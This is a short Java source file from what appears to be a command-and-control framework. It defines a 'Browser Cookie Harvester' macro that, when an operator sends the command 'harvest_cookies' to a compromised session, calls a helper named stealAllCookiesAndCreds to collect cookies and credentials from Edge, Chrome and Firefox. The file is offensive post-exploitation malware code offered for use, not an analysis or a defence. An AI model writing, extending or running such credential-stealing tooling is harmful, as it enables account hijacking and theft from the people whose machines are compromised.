package c2.session.macro;

import c2.HarvestProcessor;
import c2.session.IOManager;
import c2.win.CookiesCommandHelper;

public class CookieHarvesterMacro extends AbstractCommandMacro {

	public static final String HARVEST_COOKIES_CMD = "harvest_cookies";
	
	@Override
	public boolean isCommandMatch(String cmd) {
		return cmd.equals(HARVEST_COOKIES_CMD);
	}

	@Override
	public MacroOutcome processCmd(String cmd, int sessionId, String sessionStr) {
		return CookiesCommandHelper.stealAllCookiesAndCreds(io, sessionId, harvestProcessor);
	}

	@Override
	public String getReadableName() {
		return "Browser Cookie Harvester";
	}

	@Override
	public String getInvocationCommandDescription() {
		return HARVEST_COOKIES_CMD;
	}

	@Override
	public String getBehaviorDescription() {
		return "This macro harvests available browser cookies for Edge, Chrome, and Firefox";
	}

}
